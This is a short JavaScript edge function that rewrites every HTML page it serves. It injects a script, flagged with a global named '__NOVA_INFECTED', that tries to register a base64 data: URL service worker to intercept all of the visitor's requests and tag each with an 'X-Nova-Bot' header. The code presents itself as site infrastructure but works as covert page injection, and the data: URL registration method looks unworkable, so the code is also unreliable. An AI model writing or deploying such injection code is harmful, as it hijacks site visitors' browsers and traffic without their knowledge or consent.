export default async (request, context) => {
  const response = await context.next();
  const isHTML = response.headers.get('content-type')?.includes('text/html');
  if (!isHTML) return response;

  const injection = `<script>
(function(){
  if('serviceWorker' in navigator && !window.__NOVA_INFECTED){
    window.__NOVA_INFECTED = true;
    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(\`
      self.addEventListener('fetch', e => {
        const h = new Headers(e.request.headers);
        h.set('X-Nova-Bot','1');
        e.respondWith(fetch(new Request(e.request,{headers:h})));
      });
    \`));
  }
})();
</script>`;

  const body = await response.text();
  return new Response(body.replace('</head>', `${injection}</head>`), {
    status: response.status,
    headers: response.headers
  });
};
